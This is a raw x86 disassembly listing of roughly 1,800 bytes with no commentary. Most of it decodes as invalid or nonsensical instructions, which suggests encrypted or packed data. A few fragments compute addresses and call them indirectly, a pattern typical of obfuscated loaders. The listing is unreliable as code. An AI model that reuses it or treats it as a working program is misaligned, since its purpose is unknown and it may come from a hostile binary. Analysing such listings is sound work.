  416041:	mov    cl,0xcd
  416043:	dec    esi
  416044:	ins    BYTE PTR es:[edi],dx
  416045:	das    
  416046:	dec    BYTE PTR [ebp+0x48644463]
  41604c:	pop    ds
  41604d:	jo     0x4160a3
  41604f:	jge    0x4160af
  416051:	xchg   esi,eax
  416052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416053:	mov    ah,0x3d
  416055:	fs push edi
  416057:	fimul  DWORD PTR [ebp-0xc]
  41605a:	retf   
  41605b:	pop    esi
  41605c:	xor    al,0x45
  41605e:	dec    edx
  41605f:	(bad)  
  416060:	or     ebx,DWORD PTR [ebp-0x65]
  416063:	sbb    bl,BYTE PTR [eax+0x558b3eb4]
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160b8
  41609a:	shl    ah,cl
  41609c:	add    edx,ecx
  41609e:	pop    ss
  41609f:	jg     0x416111
  4160a1:	mov    ecx,0xce70707e
  4160a6:	sub    BYTE PTR [ecx],bh
  4160a8:	xor    dh,BYTE PTR [ecx+edx*8+0x9]
  4160ac:	cwde   
  4160ad:	frstor ss:[eax]
  4160b0:	ficomp WORD PTR [edx]
  4160b2:	push   0xffffffca
  4160b4:	mov    ah,0xdc
  4160b6:	icebp  
  4160b7:	jmp    0xd45878fe
  4160bc:	gs ret 0xe769
  4160c0:	xchg   esp,eax
  4160c1:	adc    BYTE PTR [eax-0x3f],ch
  4160c4:	mov    esp,0xe10219a4
  4160c9:	pop    edx
  4160ca:	ss mov ch,dl
  4160cd:	ja     0x4160eb
  4160cf:	mov    al,cl
  4160d1:	out    dx,al
  4160d2:	and    DWORD PTR [edi+0x1d005470],ebp
  4160d8:	ins    BYTE PTR es:[edi],dx
  4160d9:	int    0xd1
  4160db:	out    0x1d,eax
  4160dd:	mov    ecx,edx
  4160df:	xchg   ebx,eax
  4160e0:	dec    ebx
  4160e1:	dec    esi
  4160e2:	mov    ebx,0xfe951524
  4160e7:	push   ebx
  4160e8:	ror    DWORD PTR [edx-0x3a],0x6c
  4160ec:	push   ebx
  4160ed:	stos   DWORD PTR es:[edi],eax
  4160ee:	dec    eax
  4160ef:	push   0xffffffd4
  4160f1:	xor    BYTE PTR [eax],al
  4160f3:	leave  
  4160f4:	sub    esi,DWORD PTR [edx-0x40cd0f2b]
  4160fa:	in     al,dx
  4160fb:	imul   edi,DWORD PTR [edi+ecx*4-0x44],0x44
  416100:	mov    cl,0x60
  416102:	push   cs
  416103:	adc    esi,0xd8fe9ef2
  416109:	sahf   
  41610a:	int3   
  41610b:	push   0x22
  41610d:	aas    
  41610e:	jecxz  0x416123
  416110:	and    DWORD PTR [ecx],0x16
  416113:	aas    
  416114:	push   ecx
  416115:	mov    edi,DWORD PTR [esi]
  416117:	cmp    al,0x26
  416119:	jnp    0x4160a0
  41611b:	adc    esi,DWORD PTR [ebp-0x32333153]
  416121:	dec    ebp
  416122:	dec    esi
  416123:	mov    WORD PTR [ebx+eax*1+0x37],gs
  416127:	adc    al,0x84
  416129:	int    0x9b
  41612b:	mov    cl,0x17
  41612d:	xchg   esp,eax
  41612e:	lea    esi,[ebx]
  416130:	(bad)
  416133:	dec    eax
  416134:	bound  edx,QWORD PTR [edx-0x47]
  416137:	jmp    0x1502:0xb394bf9c
  41613e:	add    eax,0x876cc7b1
  416143:	jl     0x416136
  416145:	imul   esi,ebp,0x69
  416148:	call   0xdfd5b740
  41614d:	cld    
  41614e:	dec    ebp
  41614f:	scas   al,BYTE PTR es:[edi]
  416150:	sbb    al,0x1c
  416152:	test   al,0x60
  416154:	sub    cl,BYTE PTR [ebp-0x6b]
  416157:	and    BYTE PTR [ecx+0x18],bl
  41615a:	mov    esp,ds
  41615c:	lods   al,BYTE PTR ds:[esi]
  41615d:	loop   0x41613d
  41615f:	mov    BYTE PTR [ecx+0x8],dh
  416162:	addr16 and eax,0x18fde1ed
  416168:	inc    edx
  416169:	lods   al,BYTE PTR ds:[esi]
  41616a:	sbb    dh,BYTE PTR [edi]
  41616c:	or     eax,0x8b611912
  416171:	jecxz  0x4161d2
  416173:	sub    esp,DWORD PTR gs:[ebp+0x1]
  416177:	xor    WORD PTR [esi],dx
  41617a:	mov    ecx,0x1e75167b
  41617f:	and    BYTE PTR [edx],dl
  416181:	mov    al,0xd0
  416183:	pop    esp
  416184:	push   es
  416185:	pop    ebx
  416186:	xchg   esp,eax
  416187:	daa    
  416188:	fdivr  DWORD PTR [ebx-0x5fbd4f41]
  41618e:	and    BYTE PTR [edi-0x70],dl
  416191:	popf   
  416192:	in     al,dx
  416193:	ja     0x416127
  416195:	pop    es
  416196:	push   es
  416197:	inc    ebx
  416198:	or     ecx,DWORD PTR [eax]
  41619a:	and    ebp,DWORD PTR [edi+ecx*1]
  41619d:	leave  
  41619e:	mov    bl,0xed
  4161a0:	xchg   edx,eax
  4161a1:	sbb    al,0x5b
  4161a3:	or     esp,0x1
  4161a6:	cld    
  4161a7:	dec    ebx
  4161a8:	ja     0x416229
  4161aa:	in     eax,0xd4
  4161ac:	sub    al,BYTE PTR cs:[ebx+ebp*1+0x46e0e3da]
  4161b4:	and    BYTE PTR [edx-0x1a],cl
  4161b7:	nop
  4161b8:	in     eax,0x82
  4161ba:	push   edx
  4161bb:	shr    dl,1
  4161bd:	bound  ebx,QWORD PTR [ebp-0x68]
  4161c0:	fld    TBYTE PTR [edi+0x2c]
  4161c3:	imul   esi,DWORD PTR [edi-0x24],0x1c4659ad
  4161ca:	dec    ebp
  4161cb:	pop    ss
  4161cc:	mov    dl,0x36
  4161ce:	push   0x23
  4161d0:	cdq    
  4161d1:	test   al,0x53
  4161d3:	mov    edi,DWORD PTR [eax]
  4161d5:	out    0xfa,eax
  4161d7:	pusha  
  4161d8:	jp     0x41621e
  4161da:	pop    ebx
  4161db:	mov    ebx,0x5e4b973b
  4161e0:	fst    DWORD PTR [ecx+0x4b]
  4161e3:	add    dh,BYTE PTR [eax]
  4161e5:	sub    eax,0xfcee0b94
  4161ea:	fwait
  4161eb:	adc    BYTE PTR [ecx-0x5c],dh
  4161ee:	test   BYTE PTR fs:[ebx-0x6f049060],dl
  4161f5:	mov    edi,0x5ecd0cec
  4161fa:	mov    dh,BYTE PTR ds:0x8432518a
  416200:	cmp    eax,0xefd7c90f
  416205:	adc    esi,DWORD PTR [edi]
  416207:	test   al,0xd6
  416209:	adc    edi,0x66
  41620c:	jb     0x4161cb
  41620e:	sub    DWORD PTR [eax-0x1ef03744],esi
  416214:	push   ecx
  416215:	jle    0x4161d1
  416217:	sahf   
  416218:	lahf   
  416219:	push   0x4c
  41621b:	and    eax,0x11c7ff73
  416220:	test   eax,0x1a8549e6
  416225:	mov    DWORD PTR [edx+0x8b0f77e],edi
  41622b:	fld    st(6)
  41622d:	cwde   
  41622e:	stc    
  41622f:	(bad)  
  416232:	and    ebx,edi
  416234:	jo     0x416270
  416236:	lds    esi,FWORD PTR [esi]
  416238:	dec    ecx
  416239:	and    esi,DWORD PTR [ebx-0x48091096]
  41623f:	aas    
  416240:	leave  
  416241:	mov    esi,0x962f689b
  416246:	sub    BYTE PTR [ebx+esi*2],ch
  416249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41624a:	mov    bh,0x51
  41624d:	and    ah,BYTE PTR [eax-0x77]
  416250:	cmp    DWORD PTR [edx-0x55],edx
  416253:	ror    BYTE PTR [edx-0x3f],cl
  416256:	ret    0xc667
  416259:	pushf  
  41625a:	repz add dh,BYTE PTR [esi+ebp*1+0x441cc56]
  416262:	and    BYTE PTR [ebp-0x19],0x40
  416266:	ret    0x32b
  416269:	pop    ebx
  41626a:	ins    BYTE PTR es:[edi],dx
  41626b:	jo     0x416213
  41626d:	xchg   esp,eax
  41626e:	and    BYTE PTR [ebp+edx*2+0x4dc27786],dl
  416275:	push   ebx
  416276:	jo     0x41624f
  416278:	cld    
  416279:	cwde   
  41627a:	repnz adc al,0xa4
  41627d:	test   DWORD PTR [ecx+0x3b0b945d],edx
  416283:	sbb    dl,bl
  416285:	dec    ecx
  416286:	test   eax,0xd0870ce5
  41628b:	or     ah,BYTE PTR [ebx+0x522f07bf]
  416291:	jae    0x416261
  416293:	add    eax,0x526a4791
  416298:	fmul   st,st(0)
  41629a:	iret   
  41629b:	mov    ds:0x45467ff7,al
  4162a0:	pop    es
  4162a1:	cmp    BYTE PTR [ebp+ecx*8-0x2a52ba59],0x81
  4162a9:	inc    ecx
  4162aa:	push   ebx
  4162ab:	out    0xa5,al
  4162ad:	out    dx,al
  4162ae:	xor    BYTE PTR [esi+0x36b88fbc],ah
  4162b4:	xchg   DWORD PTR [edx+eax*4],eax
  4162b7:	sbb    bh,dh
  4162b9:	and    al,0xa7
  4162bb:	(bad)
  4162bf:	ret    
  4162c0:	pop    ecx
  4162c1:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162c3:	inc    edx
  4162c4:	ret    0xc27f
  4162c7:	jns    0x41633e
  4162c9:	sbb    al,ch
  4162cb:	adc    ebp,DWORD PTR [ebx+0x488ec296]
  4162d1:	xchg   DWORD PTR [ebp+0x57],eax
  4162d4:	mov    dh,0xb
  4162d6:	jge    0x416307
  4162d8:	ins    BYTE PTR es:[edi],dx
  4162d9:	cwde   
  4162da:	mov    ebx,0x6563b749
  4162df:	(bad)  
  4162e0:	aam    0x74
  4162e2:	sti    
  4162e3:	jecxz  0x4162fc
  4162e5:	xchg   esi,eax
  4162e6:	and    dh,dh
  4162e8:	data16 jb 0x416319
  4162eb:	clc    
  4162ec:	(bad)  
  4162ed:	jp     0x416312
  4162ef:	(bad)  
  4162f0:	sub    eax,0xece79cf7
  4162f5:	push   cs
  4162f6:	cmp    al,0x7f
  4162f8:	add    edx,DWORD PTR [ebx+ebx*4-0xd]
  4162fc:	call   0x7246:0x12dd35a4
  416303:	in     al,0xfb
  416305:	adc    BYTE PTR [edi+eax*4],ah
  416308:	gs ret 
  41630a:	jne    0x4162fc
  41630c:	push   edi
  41630d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41630e:	sub    BYTE PTR [edi],dh
  416310:	xor    BYTE PTR [eax+0x70],al
  416313:	ds push esp
  416315:	cmp    al,0xb4
  416317:	(bad)  
  416318:	(bad)  
  41631a:	in     eax,0x30
  41631c:	clc    
  41631d:	outs   dx,BYTE PTR ds:[esi]
  41631e:	mov    al,0x60
  416320:	xor    al,0x4c
  416322:	aaa    
  416323:	mov    edi,0x7ef6a0d
  416328:	shr    DWORD PTR [eax+0x52],1
  41632b:	or     edx,DWORD PTR [eax-0x247a231e]
  416331:	sahf   
  416332:	sub    eax,0xcd16afd9
  416337:	mov    ch,0xf7
  416339:	ds cs cwde 
  41633c:	pop    ds
  41633d:	sub    BYTE PTR [edx+0x15],0xef
  416341:	cdq    
  416342:	out    dx,al
  416343:	fist   WORD PTR [esp+ebp*4+0x3299d3e1]
  41634a:	mov    BYTE PTR [edx-0x5d],0x25
  41634e:	dec    ch
  416350:	mov    eax,0x7d3b74ab
  416355:	jno    0x41632e
  416357:	bound  ebx,QWORD PTR [esi+0x58]
  41635a:	xchg   edx,eax
  41635b:	sub    BYTE PTR [ecx+edi*2+0x3b],bh
  41635f:	scas   al,BYTE PTR es:[edi]
  416360:	sbb    BYTE PTR gs:[edi+0x2b422d31],bh
  416367:	es iret 
  416369:	imul   edi,DWORD PTR [eax+0x68],0x8d084d8b
  416370:	mov    WORD PTR [edx],cs
  416372:	pushf  
  416373:	jb     0x4163a7
  416375:	add    BYTE PTR [ebx],bh
  416377:	enter  0x850f,0x22
  41637b:	icebp  
  41637c:	(bad)  
  41637d:	dec    DWORD PTR [ebx+0x5e9de]
  416383:	add    BYTE PTR [eax],al
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0xc934c841
  4163bf:	movsx  edx,WORD PTR [ebx]
  4163c2:	adc    al,0x7f
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x4163e9
  4163ca:	and    ch,ch
  4163cc:	stos   BYTE PTR es:[edi],al
  4163cd:	add    cl,BYTE PTR [eax-0x34]
  4163d0:	daa    
  4163d1:	fstp   TBYTE PTR [edx]
  4163d3:	sub    al,0xdb
  4163d5:	jne    0x416378
  4163d7:	xchg   esi,eax
  4163d8:	inc    edi
  4163d9:	sbb    eax,0x16ebfca7
  4163de:	das    
  4163df:	jo     0x416414
  4163e1:	repz pop esi
  4163e3:	retf   0x739b
  4163e6:	push   ds
  4163e7:	mov    ds:0x94aea8d5,eax
  4163ec:	push   edi
  4163ed:	jne    0x41641b
  4163ef:	push   ebx
  4163f0:	jecxz  0x4163c5
  4163f2:	sub    eax,DWORD PTR [esi]
  4163f4:	xchg   edi,eax
  4163f5:	xlat   BYTE PTR ds:[ebx]
  4163f6:	std    
  4163f7:	fidivr WORD PTR [ebp+0x16]
  4163fa:	sbb    eax,0xcbc934b1
  4163ff:	xor    DWORD PTR [ebx],esp
  416401:	xchg   ecx,eax
  416402:	loop   0x41639c
  416404:	pcmpeqd mm0,QWORD PTR [edx]
  416407:	test   al,0xa9
  416409:	sub    al,0x6d
  41640b:	inc    edx
  41640c:	pop    edx
  41640d:	call   0x9f9162d
  416412:	sti    
  416413:	add    al,0xd9
  416415:	rol    BYTE PTR [ebx],0xfe
  416418:	xor    DWORD PTR [edx+0x47057a0e],edi
  41641e:	rcl    BYTE PTR [edi],0x6b
  416421:	(bad)  
  416422:	(bad)  
  416423:	cld    
  416424:	add    ch,BYTE PTR [esi-0x45993409]
  41642a:	pop    esp
  41642b:	mov    eax,ds:0x61988c45
  416430:	jne    0x416446
  416432:	push   ebx
  416433:	xchg   ebp,eax
  416434:	ficomp DWORD PTR [esp+ebx*4-0x74]
  416438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416439:	sbb    al,0x65
  41643b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41643c:	popf   
  41643d:	pop    edi
  41643e:	jb     0x4163d6
  416440:	dec    edx
  416441:	jbe    0x416413
  416443:	mov    ebx,0xac839e8d
  416448:	pop    ebx
  416449:	sub    al,0xd7
  41644b:	shl    BYTE PTR [ebp+0x46],1
  41644e:	adc    ebx,DWORD PTR [edi]
  416450:	inc    esi
  416451:	scas   eax,DWORD PTR es:[edi]
  416452:	icebp  
  416453:	mov    eax,0xb0852f5e
  416458:	nop
  416459:	enter  0x26ea,0xee
  41645d:	iret   
  41645e:	mov    ecx,0x444b6bf1
  416463:	adc    eax,DWORD PTR [edx-0x51]
  416466:	and    ah,BYTE PTR [edi]
  416468:	xor    DWORD PTR [eax+0x2db27c09],eax
  41646e:	sti    
  41646f:	dec    ecx
  416470:	add    BYTE PTR [edx],bl
  416472:	inc    edi
  416473:	pop    esp
  416474:	or     ecx,DWORD PTR [ecx]
  416476:	mov    cl,0x83
  416478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416479:	sbb    esp,DWORD PTR [ebp-0x633068b7]
  41647f:	outs   dx,BYTE PTR ds:[esi]
  416480:	xchg   esi,esp
  416482:	aaa    
  416483:	mov    ds:0xd4724c1d,al
  416488:	mov    ds:0x5658d6e1,eax
  41648d:	fcmovne st,st(1)
  41648f:	es test BYTE PTR ss:[edx+0x50],ch
  416494:	aad    0x65
  416496:	inc    esi
  416497:	loopne 0x416456
  416499:	inc    eax
  41649a:	js     0x416445
  41649c:	jmp    0x6e17a6e
  4164a1:	(bad)  
  4164a2:	cli    
  4164a3:	push   ecx
  4164a4:	push   0xffffffe4
  4164a6:	aad    0x22
  4164a8:	outs   dx,BYTE PTR ds:[esi]
  4164a9:	sub    eax,DWORD PTR ds:0xb1e863d6
  4164af:	push   0x4f
  4164b1:	adc    al,0xe2
  4164b3:	retf   
  4164b4:	push   ss
  4164b5:	xchg   edi,eax
  4164b6:	sti    
  4164b7:	mov    ebx,0x91138d06
  4164bc:	je     0x416445
  4164be:	xchg   DWORD PTR [ecx-0x6ef43211],eax
  4164c4:	add    edx,DWORD PTR [esi]
  4164c6:	sub    DWORD PTR [eax+0x76],ebx
  4164c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164ca:	lods   al,BYTE PTR ds:[esi]
  4164cb:	pop    esi
  4164cc:	sbb    ebp,DWORD PTR [ecx]
  4164ce:	ret    0x1d8a
  4164d1:	outs   dx,DWORD PTR ds:[esi]
  4164d2:	neg    ch
  4164d4:	xor    eax,0xb620832e
  4164d9:	dec    esp
  4164da:	pusha  
  4164db:	xor    esp,DWORD PTR [edx]
  4164dd:	dec    eax
  4164de:	dec    ebp
  4164df:	mov    BYTE PTR [eax-0x24],ch
  4164e2:	aaa    
  4164e3:	pusha  
  4164e4:	adc    esi,DWORD PTR [edi-0x3c]
  4164e7:	jl     0x416546
  4164e9:	xor    dh,BYTE PTR ds:0x46891da7
  4164ef:	shl    DWORD PTR [edi+0x17],1
  4164f2:	push   ecx
  4164f3:	icebp  
  4164f4:	sbb    edx,esp
  4164f6:	pusha  
  4164f7:	dec    eax
  4164f8:	jmp    0x80675551
  4164fd:	xor    ebx,DWORD PTR [ebx-0x28bd9ea4]
  416503:	cs iret 
  416505:	inc    esi
  416506:	jb     0x416585
  416508:	lods   al,BYTE PTR ds:[esi]
  416509:	add    DWORD PTR [eax-0x5],eax
  41650c:	cld    
  41650d:	aas    
  41650e:	in     al,dx
  41650f:	jno    0x41655d
  416511:	xchg   edx,eax
  416512:	jmp    0xe57072af
  416517:	inc    esp
  416518:	push   eax
  416519:	(bad)  
  41651a:	in     al,dx
  41651b:	repnz data16 fwait
  41651e:	push   edx
  41651f:	mov    esi,0x6cd449df
  416524:	jge    0x41658f
  416526:	in     al,dx
  416527:	xor    eax,0x7dd82dca
  41652c:	push   ss
  41652d:	and    DWORD PTR [esi-0x4b0cd57a],eax
  416533:	cdq    
  416534:	neg    BYTE PTR [esi+ebx*4]
  416537:	int    0x14
  416539:	push   edi
  41653a:	jb     0x4164bd
  41653c:	adc    ebp,edi
  41653e:	movhps QWORD PTR [edx-0x7abe5426],xmm2
  416545:	mov    bh,0xa7
  416547:	jae    0x41657c
  416549:	xlat   BYTE PTR ds:[ebx]
  41654a:	cmp    al,0xc0
  41654d:	fnstcw WORD PTR [ecx]
  41654f:	lea    eax,[esi]
  416551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416552:	in     eax,0xef
  416554:	xchg   edi,eax
  416555:	aam    0xb5
  416557:	dec    ecx
  416558:	mov    cl,0xa3
  41655a:	mov    ecx,0x1288b177
  41655f:	add    dh,BYTE PTR [ecx-0x3f8a04f2]
  416565:	(bad)  
  416566:	fild   QWORD PTR [eax-0x36db8aa1]
  41656c:	imul   edi,DWORD PTR [esp+eax*1-0x7f],0x15
  416571:	add    al,0xa
  416573:	ja     0x416567
  416575:	pop    ss
  416576:	xor    dl,BYTE PTR [ebx+0x3220ed0d]
  41657c:	js     0x41654b
  41657e:	(bad)  
  41657f:	and    dh,BYTE PTR [ecx-0x2c]
  416582:	fs mov ebp,0xe0619304
  416588:	mov    ecx,0x3e644f97
  41658d:	adc    ebx,DWORD PTR [esi+eiz*4-0x5c31f30b]
  416594:	int3   
  416595:	sub    al,0x42
  416597:	bound  esi,QWORD PTR [esi-0x13aa7c9c]
  41659d:	out    0x4f,al
  41659f:	dec    edx
  4165a0:	mov    ecx,0x865d8ab7
  4165a5:	sub    cl,bh
  4165a7:	(bad)  
  4165a8:	xor    DWORD PTR [ebx-0x77],ecx
  4165ab:	(bad)  
  4165ac:	adc    al,0xa7
  4165ae:	icebp  
  4165af:	sar    BYTE PTR [ebp+0x27baeaf],1
  4165b5:	push   ds
  4165b6:	test   eax,0x3e2821b6
  4165bb:	mov    gs,WORD PTR [edx+0x79]
  4165be:	jecxz  0x41663a
  4165c0:	cmp    ebp,ebp
  4165c2:	(bad)  
  4165c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165c4:	int3   
  4165c5:	out    0x31,eax
  4165c7:	in     eax,dx
  4165c8:	lgs    eax,FWORD PTR [eax]
  4165cb:	in     al,0xc6
  4165cd:	sub    al,0x33
  4165cf:	mov    edi,0x44d98fa0
  4165d4:	(bad)  
  4165d6:	das    
  4165d7:	xor    DWORD PTR [ecx],ebx
  4165d9:	out    0xe1,eax
  4165db:	gs popf 
  4165dd:	mov    al,0xa8
  4165df:	push   edx
  4165e0:	mov    ?,WORD PTR [eax-0x1d]
  4165e3:	test   esp,edi
  4165e5:	mov    ah,0xea
  4165e7:	inc    ebp
  4165e8:	cmp    esp,ebx
  4165ea:	out    dx,eax
  4165eb:	ins    BYTE PTR es:[edi],dx
  4165ec:	dec    esi
  4165ed:	test   al,0xef
  4165ef:	sahf   
  4165f0:	pop    esi
  4165f1:	sbb    BYTE PTR [edx-0x10],al
  4165f4:	or     BYTE PTR [esi+ebp*1],cl
  4165f7:	rcl    DWORD PTR ss:[eax],cl
  4165fa:	cmp    esp,DWORD PTR [esi]
  4165fc:	push   esi
  4165fd:	xchg   ebp,eax
  4165fe:	or     DWORD PTR [edx],0x272e40d
  416604:	push   edi
  416605:	into   
  416606:	fsubr  DWORD PTR cs:[ecx]
  416609:	jo     0x416653
  41660b:	ror    BYTE PTR [edi+0x5ba9ec91],cl
  416611:	int3   
  416612:	pop    esp
  416613:	(bad)  [ebp-0x7d]
  416616:	sbb    ch,cl
  416618:	jl     0x4165ef
  41661a:	fisttp WORD PTR [eax+ebp*4]
  41661d:	push   ecx
  41661e:	div    DWORD PTR [esi-0x3e]
  416621:	popf   
  416622:	mov    WORD PTR [ecx],ss
  416624:	enter  0x5ee9,0x23
  416628:	cmp    dl,bh
  41662a:	sbb    eax,DWORD PTR [edx-0x6b]
  41662d:	ror    BYTE PTR [esi],1
  41662f:	xchg   ebp,eax
  416630:	outs   dx,BYTE PTR ds:[esi]
  416631:	fs push ecx
  416633:	mov    bh,0x72
  416635:	dec    edx
  416636:	fadd   QWORD PTR [eax]
  416638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416639:	push   0xf80182b8
  41663e:	jne    0x416671
  416640:	push   es
  416641:	sub    BYTE PTR [edx],cl
  416643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416644:	and    al,0x7b
  416646:	lds    ebx,FWORD PTR [ebp+0x3da2e12e]
  41664c:	sbb    BYTE PTR [esi+ebp*2],dl
  41664f:	into   
  416650:	push   0xf1207db5
  416655:	sbb    dh,BYTE PTR [eax+0x7b]
  416658:	jne    0x416673
  41665a:	inc    esi
  41665b:	pop    edi
  41665c:	mov    ebp,0x30bb5e9a
  416661:	cmc    
  416662:	leave  
  416663:	sbb    DWORD PTR [edx-0x45ca6943],ebx
  416669:	aad    0x11
  41666b:	mov    cl,0xc6
  41666d:	inc    ecx
  41666e:	and    eax,ebp
  416670:	inc    edx
  416671:	or     ah,BYTE PTR [esi-0x4c1a52e5]
  416677:	stc    
  416678:	jle    0x4166d8
  41667a:	std    
  41667b:	add    DWORD PTR [esi+0x6c],edx
  41667e:	lds    esp,FWORD PTR [edx]
  416680:	outs   dx,DWORD PTR ds:[esi]
  416681:	js     0x4166c4
  416683:	jl     0x4166b1
  416685:	loop   0x41664d
  416687:	hlt    
  416688:	cmp    edx,DWORD PTR [eax-0x2cfbaf02]
  41668e:	mov    WORD PTR [ecx-0x6e],ds
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416679
  4166ae:	cli    
  4166af:	push   0x7f125cc1
  4166b4:	jo     0x41666f
  4166b6:	jle    0x416728
  4166b8:	jo     0x4166a2
  4166ba:	dec    edi
  4166bb:	dec    edi
  4166bc:	enter  0xc233,0x79
  4166c0:	sub    al,0x35
  4166c2:	icebp  
  4166c3:	(bad)  
  4166c4:	mov    bx,0x100a
  4166c8:	(bad)  
  4166c9:	aam    0xf7
  4166cb:	ffreep st(2)
  4166cd:	pop    ds
  4166ce:	cmp    edi,DWORD PTR [ebx]
  4166d0:	dec    esi
  4166d1:	ffree  st(1)
  4166d3:	gs cli 
  4166d5:	add    DWORD PTR [eax],0x75
  4166d8:	adc    BYTE PTR [edi],dl
  4166da:	mov    ds:0xb9f2eedb,al
  4166df:	fiadd  WORD PTR [ecx+edi*8+0x1d2d1089]
  4166e6:	push   ebp
  4166e7:	stos   BYTE PTR es:[edi],al
  4166e8:	jo     0x4166e9
  4166ea:	mov    al,0x87
  4166ec:	test   DWORD PTR [edi-0x250295c8],esp
  4166f2:	jno    0x4166c4
  4166f4:	popf   
  4166f5:	add    ah,BYTE PTR [edx+0x7a]
  4166f8:	aaa    
  4166f9:	sbb    BYTE PTR [ebx],dh
  4166fb:	mov    al,ds:0x768dc290
  416700:	test   ch,cl
  416702:	aam    0x6e
  416704:	ror    DWORD PTR [edi+0xf5b550a],0x40
  41670b:	push   edi
  41670c:	cmp    DWORD PTR [ebp-0x26],ebx
  41670f:	xchg   ebp,eax
  416710:	in     al,dx
  416711:	pop    edx
  416712:	jne    0x4166d7
  416714:	or     DWORD PTR [esi],eax
  416716:	outs   dx,BYTE PTR ds:[esi]
  416717:	sbb    edi,DWORD PTR [ebx+0x368d9b8a]
  41671d:	inc    ebx
  41671e:	sub    esp,DWORD PTR [edx+eiz*8]
  416721:	pop    es
  416722:	clc    
  416723:	sti    
  416724:	jmp    0x2468:0xb50cc9a6
  41672b:	gs xor eax,0x4368c76b
  416731:	test   al,0x9b
  416733:	dec    ecx
  416734:	enter  0x5e19,0xee
  416738:	xchg   edi,eax
  416739:	test   BYTE PTR [ebp-0x646d433],ah
  41673f:	dec    ebx
  416740:	imul   esp,DWORD PTR [ebp+0x7d427fe8],0x6c
  416747:	and    ebx,DWORD PTR [ecx-0x67]
  41674a:	push   eax
  41674b:	jo     0x4167c5
  41674d:	pop    eax
  41674e:	cmp    BYTE PTR [edx+edi*8],dh
  416751:	je     0x4166e3
  416753:	out    dx,eax
  416754:	aas    
  416755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416756:	enter  0x30b,0x88
  41675a:	xchg   ebx,eax
  41675b:	ds inc ebp
  41675d:	jmp    0x416708
  41675f:	sub    dh,cl
  416761:	fild   QWORD PTR [edx+0x3d64a396]
  416767:	mov    al,es:0x5483a740
  41676d:	mov    al,0x9e
  41676f:	sub    cl,cl
  416771:	push   ss
  416772:	and    esi,DWORD PTR [eax-0x6]
  416775:	sub    ah,BYTE PTR [edx]
  416777:	and    eax,0x282aa27a
  41677c:	cld    
  41677d:	jmp    0xe756419a
  416782:	inc    eax
  416783:	cli    
  416784:	xor    BYTE PTR [edi],bl
  416786:	pop    edi
  416787:	(bad)  
  416788:	das    
  416789:	scas   al,BYTE PTR es:[edi]
  41678a:	sub    ch,ah
  41678c:	pop    esi
  41678d:	cmp    al,0x13
  41678f:	(bad)  
  416790:	in     al,0x22
  416792:	rcl    BYTE PTR [esi],cl
  416794:	int3   
  416795:	loop   0x4167e4
  416797:	adc    esp,DWORD PTR [ecx+0x35]
  41679a:	pop    ecx
  41679b:	enter  0x15af,0x15
  41679f:	cdq    
  4167a0:	daa    
  4167a1:	clc    
  4167a2:	dec    edx
  4167a3:	jmpw   0xd314
  4167a7:	pop    esp
  4167a8:	out    dx,eax
  4167a9:	or     eax,0x5402ffcc
  4167ae:	push   ss
  4167af:	pshufw mm0,QWORD PTR ds:0x9103b4c1,0x2c
  4167b7:	adc    ebp,DWORD PTR [ebx-0x58]
  4167ba:	rol    DWORD PTR [edx-0x5b],cl
  4167bd:	icebp  
  4167be:	pop    eax
  4167bf:	push   cs
  4167c0:	outs   dx,DWORD PTR ds:[esi]
  4167c1:	fild   WORD PTR [edx+eax*1+0x69dc4140]
  4167c8:	outs   dx,DWORD PTR ds:[esi]
  4167c9:	sbb    bl,ch
  4167cb:	sbb    DWORD PTR [ecx-0x38],ecx
  4167ce:	pop    es
  4167cf:	std    
  4167d0:	ror    DWORD PTR [ebp-0xd],cl
  4167d3:	out    0x39,al
  4167d5:	lods   al,BYTE PTR ds:[esi]
  4167d6:	sbb    BYTE PTR [edx-0x7805397d],cl
  4167dc:	pop    ebp
  4167dd:	fldenv [edi+0x765d4815]
  4167e3:	frstor [eax-0x32]
